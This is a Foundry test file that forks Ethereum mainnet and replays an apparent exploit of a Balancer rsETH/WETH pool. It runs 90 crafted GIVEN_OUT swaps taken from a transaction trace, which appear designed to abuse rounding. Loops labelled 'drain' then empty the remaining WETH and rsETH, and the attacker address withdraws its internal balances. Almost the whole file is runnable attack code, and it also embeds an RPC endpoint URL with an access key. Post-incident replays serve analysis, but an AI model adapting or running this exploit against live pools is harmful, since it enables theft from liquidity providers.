// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;

    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract BalancerRsEthWethPoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    bytes32 constant POOL_ID_RSETH = 0x58aadfb1afac0ad7fca1148f3cde6aedf5236b6d00000000000000000000067f;
    address constant rsETH_WETH_BPT = 0x58AAdFB1Afac0ad7fca1148f3cdE6aEDF5236B6D;
    address constant rsETH = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address constant ATTACKER = address(0xAa760D53541d8390074c61DEFeaba314675b8e3f);

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;        // GIVEN_OUT amount
        uint256 expectedIn;    // Expected amount to pay (param_0)
        uint8 indexIn;
        uint8 indexOut;
    }

    function testRsEthWethPool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("rsETH:", initialBalances[1]);
        console.log("WETH:", initialBalances[2]);

        deal(rsETH_WETH_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(rsETH_WETH_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(rsETH).approve(address(VAULT), type(uint256).max);
        WETH.approve(address(VAULT), type(uint256).max);

        // Use internal balance to accumulate funds in Vault
        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true  // Keep funds in Vault internal balance
       });

        // swaps from transaction trace
        ExactSwapData[90] memory swaps;

        swaps[0] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1176332457006284629565, expectedIn: 1201076805421509281395, indexIn: 0, indexOut: 1});
        swaps[1] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833064265, expectedIn: 764358109853518473498, indexIn: 0, indexOut: 2});
        swaps[2] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 11763324570062846295, expectedIn: 12010656467295420512, indexIn: 0, indexOut: 1});
        swaps[3] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099698330643, expectedIn: 7643510086077799864, indexIn: 0, indexOut: 2});
        swaps[4] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 117633245700628463, expectedIn: 120105448334705898, indexIn: 0, indexOut: 1});
        swaps[5] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710996983306, expectedIn: 76434391222014551, indexIn: 0, indexOut: 2});
        swaps[6] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1176332457006285, expectedIn: 1201042840693972, indexIn: 0, indexOut: 1});
        swaps[7] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 801957109969833, expectedIn: 764337295067158, indexIn: 0, indexOut: 2});
        swaps[8] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 11763324570063, expectedIn: 12009836562076, indexIn: 0, indexOut: 1});
        swaps[9] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571099699, expectedIn: 7643781996846, indexIn: 0, indexOut: 2});
        swaps[10] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 117633245700, expectedIn: 119833719798, indexIn: 0, indexOut: 1});
        swaps[11] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 80195710997, expectedIn: 76700588074, indexIn: 0, indexOut: 2});
        swaps[12] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1176332457, expectedIn: 1195100784, indexIn: 0, indexOut: 1});
        swaps[13] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 801957110, expectedIn: 770251646, indexIn: 0, indexOut: 2});
        swaps[14] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 11763325, expectedIn: 11949997, indexIn: 0, indexOut: 1});
        swaps[15] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 8019571, expectedIn: 7703694, indexIn: 0, indexOut: 2});
        swaps[16] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 117633, expectedIn: 119501, indexIn: 0, indexOut: 1});
        swaps[17] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 80195, expectedIn: 77037, indexIn: 0, indexOut: 2});
        swaps[18] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 1177, expectedIn: 1196, indexIn: 0, indexOut: 1});
        swaps[19] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 802, expectedIn: 772, indexIn: 0, indexOut: 2});
        swaps[20] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: rsETH, amount: 12, expectedIn: 13, indexIn: 0, indexOut: 1});
        swaps[21] = ExactSwapData({tokenIn: rsETH_WETH_BPT, tokenOut: address(WETH), amount: 9, expectedIn: 10, indexIn: 0, indexOut: 2});
        swaps[22] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 999999982, expectedIn: 242521442565, indexIn: 2, indexOut: 1});
        swaps[23] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 505209759884, indexIn: 2, indexOut: 1});
        swaps[24] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 740000000000, expectedIn: 8632, indexIn: 1, indexOut: 2});
        swaps[25] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 8615, expectedIn: 164546695481, indexIn: 2, indexOut: 1});
        swaps[26] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 359201217183, indexIn: 2, indexOut: 1});
        swaps[27] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 530000000000, expectedIn: 99746, indexIn: 1, indexOut: 2});
        swaps[28] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 99729, expectedIn: 124012714965, indexIn: 2, indexOut: 1});
        swaps[29] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 262026461641, indexIn: 2, indexOut: 1});
        swaps[30] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 380000000000, expectedIn: 2245, indexIn: 1, indexOut: 2});
        swaps[31] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 2228, expectedIn: 81116754263, indexIn: 2, indexOut: 1});
        swaps[32] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 185639035371, indexIn: 2, indexOut: 1});
        swaps[33] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 270000000000, expectedIn: 3181, indexIn: 1, indexOut: 2});
        swaps[34] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 3164, expectedIn: 59414792200, indexIn: 2, indexOut: 1});
        swaps[35] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 133873033883, indexIn: 2, indexOut: 1});
        swaps[36] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 190000000000, expectedIn: 557, indexIn: 1, indexOut: 2});
        swaps[37] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 540, expectedIn: 37572791964, indexIn: 2, indexOut: 1});
        swaps[38] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 95389386988, indexIn: 2, indexOut: 1});
        swaps[39] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 140000000000, expectedIn: 12882, indexIn: 1, indexOut: 2});
        swaps[40] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 12865, expectedIn: 31471175794, indexIn: 2, indexOut: 1});
        swaps[41] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 68182079837, indexIn: 2, indexOut: 1});
        swaps[42] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 100000000000, expectedIn: 11952, indexIn: 1, indexOut: 2});
        swaps[43] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 11935, expectedIn: 23059669361, indexIn: 2, indexOut: 1});
        swaps[44] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 50043952133, indexIn: 2, indexOut: 1});
        swaps[45] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 74000000000, expectedIn: 68081608, indexIn: 1, indexOut: 2});
        swaps[46] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 68081591, expectedIn: 16971056367, indexIn: 2, indexOut: 1});
        swaps[47] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 35553353720, indexIn: 2, indexOut: 1});
        swaps[48] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 52000000000, expectedIn: 6472, indexIn: 1, indexOut: 2});
        swaps[49] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 6455, expectedIn: 11642770535, indexIn: 2, indexOut: 1});
        swaps[50] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 25626928172, indexIn: 2, indexOut: 1});
        swaps[51] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 38000000000, expectedIn: 142678241, indexIn: 1, indexOut: 2});
        swaps[52] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 142678224, expectedIn: 8793968805, indexIn: 2, indexOut: 1});
        swaps[53] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 18271758398, indexIn: 2, indexOut: 1});
        swaps[54] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 27000000000, expectedIn: 37323791, indexIn: 1, indexOut: 2});
        swaps[55] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 37323774, expectedIn: 6175705982, indexIn: 2, indexOut: 1});
        swaps[56] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 12989833396, indexIn: 2, indexOut: 1});
        swaps[57] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 19000000000, expectedIn: 7483, indexIn: 1, indexOut: 2});
        swaps[58] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 7466, expectedIn: 4298444362, indexIn: 2, indexOut: 1});
        swaps[59] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 9436861308, indexIn: 2, indexOut: 1});
        swaps[60] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 14000000000, expectedIn: 70418664, indexIn: 1, indexOut: 2});
        swaps[61] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 70418647, expectedIn: 3241446426, indexIn: 2, indexOut: 1});
        swaps[62] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 6724349097, indexIn: 2, indexOut: 1});
        swaps[63] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 9000000000, expectedIn: 105, indexIn: 1, indexOut: 2});
        swaps[64] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 88, expectedIn: 1369942305, indexIn: 2, indexOut: 1});
        swaps[65] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 4864998902, indexIn: 2, indexOut: 1});
        swaps[66] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 7200000000, expectedIn: 30478455, indexIn: 1, indexOut: 2});
        swaps[67] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 30478438, expectedIn: 1651719961, indexIn: 2, indexOut: 1});
        swaps[68] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 3454309834, indexIn: 2, indexOut: 1});
        swaps[69] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 5100000000, expectedIn: 10415534, indexIn: 1, indexOut: 2});
        swaps[70] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 10415517, expectedIn: 1165058728, indexIn: 2, indexOut: 1});
        swaps[71] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 2470301354, indexIn: 2, indexOut: 1});
        swaps[72] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 3600000000, expectedIn: 4200, indexIn: 1, indexOut: 2});
        swaps[73] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 4183, expectedIn: 784918068, indexIn: 2, indexOut: 1});
        swaps[74] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 1764962198, indexIn: 2, indexOut: 1});
        swaps[75] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 2600000000, expectedIn: 4107266, indexIn: 1, indexOut: 2});
        swaps[76] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 4107249, expectedIn: 587301861, indexIn: 2, indexOut: 1});
        swaps[77] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 1256903609, indexIn: 2, indexOut: 1});
        swaps[78] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 1800000000, expectedIn: 913, indexIn: 1, indexOut: 2});
        swaps[79] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 896, expectedIn: 371391165, indexIn: 2, indexOut: 1});
        swaps[80] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH, amount: 17, expectedIn: 905935333, indexIn: 2, indexOut: 1});
        swaps[81] = ExactSwapData({tokenIn: rsETH, tokenOut: address(WETH), amount: 1300000000, expectedIn: 1011, indexIn: 1, indexOut: 2});
        swaps[82] = ExactSwapData({tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 10000, expectedIn: 2, indexIn: 1, indexOut: 0});
        swaps[83] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 10000000, expectedIn: 380973, indexIn: 2, indexOut: 0});
        swaps[84] = ExactSwapData({tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 10000000000, expectedIn: 87478886, indexIn: 1, indexOut: 0});
        swaps[85] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 10000000000000, expectedIn: 141523892659, indexIn: 2, indexOut: 0});
        swaps[86] = ExactSwapData({tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 10000000000000000, expectedIn: 128359205147277, indexIn: 1, indexOut: 0});
        swaps[87] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 10000000000000000000, expectedIn: 136238774513878100, indexIn: 2, indexOut: 0});
        swaps[88] = ExactSwapData({tokenIn: rsETH, tokenOut: rsETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 11685959850500587629, indexIn: 1, indexOut: 0});
        swaps[89] = ExactSwapData({tokenIn: address(WETH), tokenOut: rsETH_WETH_BPT, amount: 990619479082334998746, expectedIn: 12103545600526537726, indexIn: 2, indexOut: 0});

        console.log("Total swaps:", swaps.length);
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_RSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,  // kind=1 from trace
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
           });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256 amountIn) {
                console.log("Swap", i, "SUCCESS - AmountIn:", amountIn);
                successCount++;
            } catch Error(string memory reason) {
                console.log("Swap", i, "FAILED:", reason);
            } catch {
                console.log("Swap", i, "FAILED (no reason)");
            }

            if (i % 5 == 4) {
                (,uint256[] memory currentBal,) = VAULT.getPoolTokens(POOL_ID_RSETH);
                console.log("After swap", i+1);
                console.log("  BPT:", currentBal[0]);
                console.log("  rsETH:", currentBal[1]);
                console.log("  WETH:", currentBal[2]);
            }
        }

        console.log("Swaps executed:", successCount);
        console.log("Total swaps:", swaps.length);

        // Continue draining the pool until almost empty
        (,uint256[] memory midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);
        console.log("Pool state before drainage:");
        console.log("  rsETH:", midBalances[1]);
        console.log("  WETH:", midBalances[2]);

        uint256 additionalSwaps = 0;
        uint256 bptBalance = IERC20(rsETH_WETH_BPT).balanceOf(ATTACKER);

        // Drain remaining WETH
        while (midBalances[2] > 1e9) { // Keep draining until minimal
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

            // Calculate amount
            uint256 wethToDrain = (midBalances[2] * 95) / 100;
            if (wethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_RSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(rsETH_WETH_BPT),
                assetOut: IAsset(address(WETH)),
                amount: wethToDrain,
                userData: ""
           });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break; // Safety limit
        }

        // Drain remaining rsETH
        while (midBalances[1] > 1e9) { // Keep draining until minimal
            (,midBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

            // Calculate amount
            uint256 rsethToDrain = (midBalances[1] * 95) / 100;
            if (rsethToDrain < 1e9) break;

            IBalancerVault.SingleSwap memory drainSwap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_RSETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(rsETH_WETH_BPT),
                assetOut: IAsset(rsETH),
                amount: rsethToDrain,
                userData: ""
           });

            try VAULT.swap(drainSwap, funds, type(uint256).max, block.timestamp + 3600) {
                additionalSwaps++;
            } catch {
                break;
            }

            if (additionalSwaps > 100) break; // Safety limit
        }

        console.log("Additional swaps:", additionalSwaps);
        console.log("=== WITHDRAWAL manageUserBalance()");

        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(address(WETH));
        internalTokens[1] = IERC20(rsETH_WETH_BPT);
        internalTokens[2] = IERC20(rsETH);
        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  WETH:", internalBalances[0] / 1e18, "ETH");
        console.log("  BPT:", internalBalances[1] / 1e18, "ETH");
        console.log("  rsETH:", internalBalances[2] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;
            if (internalBalances[0] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(address(WETH)), amount: internalBalances[0], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[1] > 0) ops[opIndex++] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(rsETH_WETH_BPT), amount: internalBalances[1], sender: ATTACKER, recipient: payable(ATTACKER)});
            if (internalBalances[2] > 0) ops[opIndex] = IBalancerVault.UserBalanceOp({kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL, asset: IAsset(rsETH), amount: internalBalances[2], sender: ATTACKER, recipient: payable(ATTACKER)});
            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }
        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_RSETH);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("rsETH:", finalBalances[1]);
        console.log("WETH:", finalBalances[2]);

        console.log("POOL DELTAS:");
        console.log("BPT delta:");
        console.logInt(int256(finalBalances[0]) - int256(initialBalances[0]));
        console.log("rsETH delta:");
        console.logInt(int256(finalBalances[1]) - int256(initialBalances[1]));
        console.log("WETH delta:");
        console.logInt(int256(finalBalances[2]) - int256(initialBalances[2]));

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(rsETH_WETH_BPT).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("WETH:", WETH.balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("rsETH:", IERC20(rsETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps:", successCount + additionalSwaps);
        console.log("SUCCESS!");
    }
    
}
